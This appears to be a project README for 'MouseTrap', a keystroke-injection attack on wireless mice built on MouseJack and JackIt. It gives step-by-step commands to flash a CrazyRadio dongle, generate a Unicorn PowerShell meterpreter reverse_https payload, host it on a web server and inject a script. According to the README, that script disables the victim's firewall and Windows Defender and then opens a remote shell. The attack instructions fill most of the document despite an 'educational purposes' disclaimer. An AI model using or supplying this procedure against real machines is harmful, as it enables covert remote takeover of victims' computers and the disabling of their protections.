# MouseTrap
This is an implementation of Bastille's exploit [MouseJack](https://github.com/BastilleResearch/mousejack) using [JackIt's](https://github.com/insecurityofthings/jackit) exploit code. Full credit goes to them for discovering this issue and writing the libraries to work with the CrazyRadio PA dongle, as well as the implementation that I have created a Ducky Script for. For more information about the vulnerability, as well as vulnerable devices, check out their Github repositories! I do not promote the use of this software maliciously. This is solely for educational purposes!
## What is MouseTrap?
MouseTrap is a Ducky Script I have written for MouseJack that allows a user to disable firewalls and Windows Defender real-time protection, and install a backdoor remotely through a victim's wireless mouse. In roughly 10 seconds, you can have a meterpreter session running without firewall interruption.
## Installation
Tested on a clean Kali Linux VM with a Crazy Radio PA
### MouseJack
Flashes CrazyRadio PA dongle with firmware and sets up dependencies
```
sudo git clone https://github.com/BastilleResearch/mousejack.git
sudo apt-get install sdcc binutils python python-pip
sudo pip install -U pip
sudo pip install -U -I pyusb
sudo pip install -U platformio
cd mousejack
git submodule init
git submodule update
cd nrf-research-firmware
make
sudo make install

```
### JackIt
Used to scan for vulnerable devices and inject payload
```
sudo git clone https://github.com/insecurityofthings/jackit.git
cd jackit
pip install -e .
```
### Unicorn
Develops Powershell payload and sets up Metasploit Meterpreter session
```
sudo git clone https://github.com/trustedsec/unicorn.git
cd unicorn
python unicorn.py windows/meterpreter/reverse_https <LHOST IP> <LPORT>
mv powershell_attack.txt /var/www/html/
service apache2 start
msfconsole -r unicorn.rc
```
## Execution
In order to optimize the speed of the payload, I created a web server on my local machine that the script downloads the Powershell payload from and executes. It is not necessary; however, recommended. In order for the script to install the payload, edit the `<LHOST>` in my `nofirewallallhack` file with your machine's IP address. When I tested the attack, both my machine and the victim's were on the same local network. Once the webserver is up and running with the Powershell payload, execute the command:
```
sudo jackit --script nofirewallallhack
```
Once the program has begun, it will scan for nearby devices. When you have identified your victim's device, hit Ctrl+C and select the device. The program will begin to inject the script, which will take roughly 10 seconds. Once the script has completed, a Meterpreter session should begin in Metasploit.
